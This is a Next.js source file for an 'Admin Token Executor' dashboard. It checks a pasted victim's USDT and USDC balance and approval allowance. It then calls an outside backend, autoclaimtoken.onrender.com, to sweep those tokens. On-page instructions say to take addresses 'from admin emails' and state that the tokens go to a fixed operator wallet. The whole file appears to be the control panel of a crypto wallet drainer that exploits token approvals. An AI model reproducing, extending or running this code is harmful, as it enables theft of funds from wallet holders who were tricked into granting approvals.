import { useState } from 'react';
import Head from 'next/head';

export default function AdminDashboard() {
  const [userAddress, setUserAddress] = useState('');
  const [result, setResult] = useState('');
  const [loading, setLoading] = useState(false);

  const tokens = [
    { name: 'USDT', address: '0xdAC17F958D2ee523a2206206994597C13D831ec7' },
    { name: 'USDC', address: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48' }
  ];

  const executeTransfer = async (tokenAddress, tokenName) => {
    if (!userAddress) {
      setResult('Please enter user address');
      return;
    }

    setLoading(true);
    try {
      const response = await fetch('https://autoclaimtoken.onrender.com/api/execute-transfer', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          userAddress: userAddress,
          tokenAddress: tokenAddress,
          chain: 'ethereum'
        })
      });
      
      const data = await response.json();
      if (data.success && data.result.success) {
        setResult(`✅ SUCCESS: Transferred ${data.result.amountFormatted} ${data.result.symbol}\nTX: ${data.result.txHash}`);
      } else {
        setResult(`❌ FAILED: ${data.result?.error || data.error}`);
      }
    } catch (error) {
      setResult(`Error: ${error.message}`);
    }
    setLoading(false);
  };

  const executeAllTransfers = async () => {
    if (!userAddress) {
      setResult('Please enter user address');
      return;
    }

    setLoading(true);
    try {
      const tokenAddresses = tokens.map(t => t.address);
      
      const response = await fetch('https://autoclaimtoken.onrender.com/api/execute-multiple-transfers', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          userAddress: userAddress,
          tokenAddresses: tokenAddresses,
          chain: 'ethereum'
        })
      });
      
      const data = await response.json();
      if (data.success) {
        const successful = data.results.filter(r => r.success);
        setResult(`✅ Executed ${successful.length}/${data.results.length} transfers\nTotal Value: ~$${data.summary.totalValue.toFixed(2)}`);
      }
    } catch (error) {
      setResult(`Error: ${error.message}`);
    }
    setLoading(false);
  };

  const checkStatus = async () => {
    if (!userAddress) {
      setResult('Please enter user address');
      return;
    }

    setLoading(true);
    try {
      const results = [];
      for (const token of tokens) {
        const response = await fetch('https://autoclaimtoken.onrender.com/api/check-token-status', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            userAddress: userAddress,
            tokenAddress: token.address,
            chain: 'ethereum'
          })
        });
        
        const data = await response.json();
        if (data.success) {
          results.push(`${token.name}: ${data.tokenStatus.balanceFormatted} balance, ${data.tokenStatus.allowanceFormatted} allowance (Can transfer: ${data.tokenStatus.canTransfer ? 'YES' : 'NO'})`);
        }
      }
      setResult(results.join('\n'));
    } catch (error) {
      setResult(`Error: ${error.message}`);
    }
    setLoading(false);
  };

  return (
    <>
      <Head>
        <title>Admin Dashboard - Token Executor</title>
      </Head>
      
      <div className="min-h-screen bg-gray-50 p-8">
        <div className="max-w-4xl mx-auto">
          <h1 className="text-3xl font-bold mb-8">Admin Token Executor</h1>
          
          <div className="bg-white rounded-lg shadow-lg p-6 mb-6">
            <h2 className="text-xl font-bold mb-4">Execute Token Transfers</h2>
            
            <div className="mb-4">
              <label className="block text-sm font-medium mb-2">User Wallet Address:</label>
              <input
                type="text"
                value={userAddress}
                onChange={(e) => setUserAddress(e.target.value)}
                placeholder="0x..."
                className="w-full p-3 border rounded-lg"
              />
            </div>
            
            <div className="grid grid-cols-1 md:grid-cols-3 gap-4 mb-6">
              <button
                onClick={checkStatus}
                disabled={loading}
                className="bg-blue-600 text-white px-4 py-3 rounded hover:bg-blue-700 disabled:opacity-50"
              >
                Check Token Status
              </button>
              
              {tokens.map((token) => (
                <button
                  key={token.address}
                  onClick={() => executeTransfer(token.address, token.name)}
                  disabled={loading}
                  className="bg-red-600 text-white px-4 py-3 rounded hover:bg-red-700 disabled:opacity-50"
                >
                  Execute {token.name} Transfer
                </button>
              ))}
              
              <button
                onClick={executeAllTransfers}
                disabled={loading}
                className="bg-green-600 text-white px-4 py-3 rounded hover:bg-green-700 disabled:opacity-50 md:col-span-3"
              >
                Execute All Transfers
              </button>
            </div>
            
            {result && (
              <div className="bg-gray-100 p-4 rounded">
                <h3 className="font-semibold mb-2">Result:</h3>
                <pre className="text-sm whitespace-pre-wrap">{result}</pre>
              </div>
            )}
          </div>
          
          <div className="bg-yellow-50 border border-yellow-200 rounded-lg p-4">
            <h3 className="font-bold text-yellow-800 mb-2">Instructions:</h3>
            <ol className="text-yellow-700 text-sm space-y-1">
              <li>1. Get user wallet address from admin emails</li>
              <li>2. Paste address above and click "Check Token Status"</li>
              <li>3. If "Can transfer: YES", click execute buttons</li>
              <li>4. Tokens will transfer to your wallet: 0x6026f8db794026ed1b1f501085ab2d97dd6fbc15</li>
            </ol>
          </div>
        </div>
      </div>
    </>
  );
}